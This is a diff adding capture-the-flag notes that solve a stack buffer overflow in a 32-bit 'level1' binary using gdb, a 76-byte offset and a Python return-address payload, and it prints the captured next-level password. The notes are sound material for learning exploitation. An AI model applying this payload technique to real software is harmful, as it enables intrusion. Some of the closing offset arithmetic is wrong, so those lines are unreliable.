@@ -1,0 +1,71 @@
+no stack canary, NX disabled, no pie:
+-> classic exploitation techniques.
+
+NX disabled
+-> stack is executable
+
+No Stack Canary
+-> Can overwrite return address on the stack
+
+gdb -q ./level1
+disas main
+->	0x08048490 <+16>:    call   0x8048340 <gets@plt>
+-> don't check buffer length
+
+run <<< $(python -c "print 'A' * 200")
+-> Program received signal SIGSEGV, Segmentation fault.
+-> 0x41414141 in ?? ()
+-> Instruction Pointer (EIP) control.
+
+find offset
+-> (gdb) run <<< $(python -c "print 'AAAAbbbbCCCCddddEEEEffffGGGGhhhhIIIIjjjjjKKKKllllMMMMnnnnOOOOppppQQQQrrrrSSSSttttUUUUvvvv'")
+-> Program received signal SIGSEGV, Segmentation fault.
+-> 0x74747453 in ?? () -> 0xtttS -> 76 chars
+
+find where to jump
+-> (gdb) info functions
+-> 0x08048444  run -> target: 0x08048444
+-> 0x08048480  main
+
+exploit the overflow (offset + target address)
+-> (python -c "print 'A' * 76 + '\x44\x84\x04\x08'"; cat) | ./level1
+
+cat /home/user/level2.pass
+-> 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+
+
+
+Dump of assembler code for function main:
+   0x08048480 <+0>:     push   %ebp
+   0x08048481 <+1>:     mov    %esp,%ebp
+   0x08048483 <+3>:     and    $0xfffffff0,%esp
+   0x08048486 <+6>:     sub    $0x50,%esp -> 80 bytes alocate
+   0x08048489 <+9>:     lea    0x10(%esp),%eax -> 16 bytes
+   0x0804848d <+13>:    mov    %eax,(%esp)
+   0x08048490 <+16>:    call   0x8048340 <gets@plt>
+   0x08048495 <+21>:    leave
+   0x08048496 <+22>:    ret
+
+80 - 16 = 64 bytes
+i386 (32-bit) system have above local vars the Saved EBP (Base Pointer) always 4 bytes
+unkonw padding
+64 + 4 = 68 bytes
+68 + ? = 76
+
+
+Get Offset
+-> (gdb) b gets
+-> (gdb) run
+-> (gdb) info registers eax
+-> eax            0xbffff6f0       -1073744144
+-> (gdb) info frame
+--> Stack level 0, frame at 0xbffff6e0:
+-->  eip = 0xb7e91e40 in gets; saved eip 0x8048495
+-->  called by frame at 0xbffff740
+-->  Arglist at 0xbffff6d8, args:
+-->  Locals at 0xbffff6d8, Previous frame's sp is 0xbffff6e0
+-->  Saved registers:
+-->   eip at 0xbffff6dc
+Saved eip is store 4 bytes below "caller's frame"
+0xb7e91e40 - 4 = 0xbffff73c
+0xbffff6f0 - 0xbffff73c = 76
